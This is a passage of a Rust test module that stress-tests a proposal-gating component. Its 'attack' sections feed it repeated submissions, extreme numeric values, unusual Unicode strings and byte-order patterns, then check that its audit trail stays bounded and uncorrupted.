            // Submit the same proposal many times to stress deduplication/handling
            for i in 0..500 {
                let mut repeated_proposal = exhaustion_proposal.clone();
                repeated_proposal.proposal_id = format!("exhaustion_base_{}", i);
                let _ = gate.submit(repeated_proposal);

                // Periodic live checks with same metrics
                if i % 10 == 0 {
                    let _ = gate.live_check(&exhaustion_proposal.predicted_metrics);
                }
            }

            // Attack 3: Memory pressure through large metric value combinations
            for pressure_round in 0..100 {
                let large_value = u32::MAX - (pressure_round % 1000);
                let pressure_proposal = OptimizationProposal {
                    proposal_id: format!("pressure_{}_{}", pressure_round, large_value),
                    knob: RuntimeKnob::DrainTimeoutMs,
                    old_value: large_value,
                    new_value: large_value.saturating_add(1),
                    predicted_metrics: PredictedMetrics {
                        throughput: f64::MAX / (pressure_round as f64 + 1.0),
                        latency_p99: f64::MAX / (pressure_round as f64 + 2.0),
                        memory_usage: usize::MAX / (pressure_round + 1).max(1000),
                    },
                };
                let _ = gate.submit(pressure_proposal);
            }

            // Attack 4: Stress test through rapid alternating operations
            for rapid_round in 0..200 {
                // Alternate between different knob types rapidly
                let knob_types = [
                    RuntimeKnob::ConcurrencyLimit,
                    RuntimeKnob::BatchSize,
                    RuntimeKnob::DrainTimeoutMs,
                    RuntimeKnob::RetryBudget,
                    RuntimeKnob::CacheCapacity,
                ];

                for (i, &knob) in knob_types.iter().enumerate() {
                    let rapid_proposal = OptimizationProposal {
                        proposal_id: format!("rapid_{}_{}", rapid_round, i),
                        knob,
                        old_value: (rapid_round + i) as u32,
                        new_value: (rapid_round + i + 1) as u32,
                        predicted_metrics: PredictedMetrics {
                            throughput: 100.0 + (i as f64),
                            latency_p99: 50.0 + (rapid_round as f64 % 100.0),
                            memory_usage: 1500 + (i * 100),
                        },
                    };
                    let _ = gate.submit(rapid_proposal);
                }

                // Stress live check with alternating patterns
                for check_variant in 0..3 {
                    let stress_metrics = PredictedMetrics {
                        throughput: 100.0 * (check_variant as f64 + 1.0),
                        latency_p99: 50.0 / (check_variant as f64 + 1.0),
                        memory_usage: 1500 * (check_variant + 1),
                    };
                    let _ = gate.live_check(&stress_metrics);
                }
            }

            // Verify system remained stable under resource pressure
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES,
                   "Audit trail should remain bounded under resource pressure");

            // Verify structural integrity of audit trail after stress test
            let mut event_code_counts = HashMap::new();
            for entry in gate.audit_trail() {
                assert!(!entry.event_code.is_empty(), "Event code should not be corrupted");
                assert!(!entry.proposal_id.is_empty() || entry.event_code.contains("ERROR"),
                       "Proposal ID should not be corrupted");

                *event_code_counts.entry(entry.event_code.clone()).or_insert(0) += 1;
            }

            // Should maintain event code diversity despite stress
            assert!(!event_code_counts.is_empty() || gate.audit_trail().is_empty(),
                   "Should maintain event code diversity under stress");

            // No single event code should dominate (indicating corruption)
            for (event_code, count) in event_code_counts {
                assert!(count <= MAX_AUDIT_TRAIL_ENTRIES,
                       "Event code {} should not exceed trail capacity", event_code);
            }
        }

        #[test]
        fn test_cross_platform_edge_cases_and_serialization_consistency() {
            let mut gate = GovernorGate::with_defaults();

            // Attack 1: Platform-specific floating point edge cases
            let platform_float_tests = vec![
                (std::f64::consts::E, std::f64::consts::PI),       // Mathematical constants
                (std::f64::consts::LN_2, std::f64::consts::LN_10), // Natural logarithms
                (2.0_f64.powi(53), 2.0_f64.powi(53) + 1.0),       // IEEE 754 precision boundary
                (1.0 / 3.0, 2.0 / 3.0),                           // Repeating decimals
                (0.1 + 0.2, 0.3),                                  // Classic floating point issue
                (f64::MAX / 2.0, f64::MAX / 3.0),                  // Large number divisions
            ];

            for (i, (float1, float2)) in platform_float_tests.iter().enumerate() {
                let float_proposal = OptimizationProposal {
                    proposal_id: format!("platform_float_{}", i),
                    knob: RuntimeKnob::ConcurrencyLimit,
                    old_value: 64,
                    new_value: 128,
                    predicted_metrics: PredictedMetrics {
                        throughput: *float1,
                        latency_p99: *float2,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(float_proposal);

                // Cross-check with live metrics
                let cross_metrics = PredictedMetrics {
                    throughput: *float2,
                    latency_p99: *float1,
                    memory_usage: 2000,
                };
                let _ = gate.live_check(&cross_metrics);
            }

            // Attack 2: String encoding and normalization edge cases
            let encoding_tests = vec![
                "ASCII_only_test",                     // Basic ASCII
                "UTF-8_test_café_naïve",              // UTF-8 accented characters
                "Emoji_test_🦀_🔒_⚡_🌈",             // Emoji sequences
                "Mixed_scripts_Ελληνικά_中文_العربية", // Multiple scripts
                "Surrogate_pairs_𝕌𝕟𝕚𝕔𝕠𝕕𝕖",        // Surrogate pairs
                "Zero_width_test\u{200B}invisible",   // Zero-width characters
                "Directional\u{202E}override",        // Text direction override
                "Normalization_cafe\u{0301}",         // Decomposed characters
            ];

            for (i, test_string) in encoding_tests.iter().enumerate() {
                let encoding_proposal = OptimizationProposal {
                    proposal_id: format!("encoding_{}_{}", i, test_string),
                    knob: RuntimeKnob::BatchSize,
                    old_value: 32,
                    new_value: 64,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0,
                        latency_p99: 50.0,
                        memory_usage: 1500,
                    },
                };
                let _ = gate.submit(encoding_proposal);
            }

            // Attack 3: Endianness and byte order edge cases
            let byte_order_values = vec![
                0x01020304_u32,    // Big-endian pattern
                0x04030201_u32,    // Little-endian pattern
                0x12345678_u32,    // Classic test pattern
                0x87654321_u32,    // Reversed pattern
                0xDEADBEEF_u32,    // Well-known pattern
                0xCAFEBABE_u32,    // Another well-known pattern
            ];

            for (i, &byte_value) in byte_order_values.iter().enumerate() {
                let endian_proposal = OptimizationProposal {
                    proposal_id: format!("endian_test_{:08X}", byte_value),
                    knob: RuntimeKnob::DrainTimeoutMs,
                    old_value: byte_value,
                    new_value: byte_value.swap_bytes(), // Test byte swapping
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0,
                        latency_p99: 50.0,
                        memory_usage: byte_value as usize,
                    },
                };
                let _ = gate.submit(endian_proposal);
            }

            // Attack 4: Serialization consistency across different representations
            for consistency_round in 0..50 {
                // Test with values that might serialize differently
                let consistency_proposal = OptimizationProposal {
                    proposal_id: format!("serialization_consistency_{}", consistency_round),
                    knob: RuntimeKnob::RetryBudget,
                    old_value: consistency_round,
                    new_value: consistency_round + 1,
                    predicted_metrics: PredictedMetrics {
                        // Use values that might have different JSON representations
                        throughput: (consistency_round as f64) + 0.1,
                        latency_p99: (consistency_round as f64) * 1.1 + 0.01,
                        memory_usage: consistency_round * 100 + 1,
                    },
                };
                let _ = gate.submit(consistency_proposal);

                // Verify with complementary live check
                let check_metrics = PredictedMetrics {
                    throughput: (consistency_round as f64) * 2.0,
                    latency_p99: (consistency_round as f64) / 2.0,
                    memory_usage: consistency_round * 50,
                };
                let _ = gate.live_check(&check_metrics);
            }

            // Attack 5: Time representation and timezone edge cases
            for time_test in 0..30 {
                // Simulate different timestamp scenarios
                let time_based_id = format!("time_edge_case_{}_{}",
                                          time_test,
                                          std::time::SystemTime::now()
                                              .duration_since(std::time::UNIX_EPOCH)
                                              .unwrap_or_default()
                                              .as_nanos() % 1000);

                let time_proposal = OptimizationProposal {
                    proposal_id: time_based_id,
                    knob: RuntimeKnob::CacheCapacity,
                    old_value: time_test * 64,
                    new_value: (time_test + 1) * 64,
                    predicted_metrics: PredictedMetrics {
                        throughput: 100.0 + (time_test as f64 % 50.0),
                        latency_p99: 50.0 + (time_test as f64 % 25.0),
                        memory_usage: 1500 + (time_test * 100),
                    },
                };
                let _ = gate.submit(time_proposal);
            }

            // Verify cross-platform consistency
            assert!(gate.audit_trail().len() <= MAX_AUDIT_TRAIL_ENTRIES);

            // Check that all audit entries maintain structural consistency
            for entry in gate.audit_trail() {
                // Verify basic structure
                assert!(!entry.event_code.is_empty(), "Event codes should remain valid");
                assert!(entry.proposal_id.len() <= 10000, "Proposal IDs should be bounded");
                assert!(entry.detail.len() <= 100000, "Details should be bounded");

                // Verify no encoding corruption
                assert!(entry.proposal_id.is_ascii() || entry.proposal_id.chars().all(|c| c != '\u{FFFD}'),
                       "Proposal ID should not contain replacement characters");

                // Verify no control character corruption (except allowed ones)
                let has_dangerous_control = entry.detail.chars()
                    .any(|c| c.is_control() && c != '\n' && c != '\t' && c != '\r');
                assert!(!has_dangerous_control || entry.detail.contains("control"),
                       "Should not have unexpected control characters");
            }

            // Verify event code consistency
            let unique_event_codes: HashSet<_> = gate.audit_trail().iter()
                .map(|e| &e.event_code)
                .collect();
            assert!(!unique_event_codes.is_empty() || gate.audit_trail().is_empty(),
                   "Should maintain event code diversity");
        }
    }
}
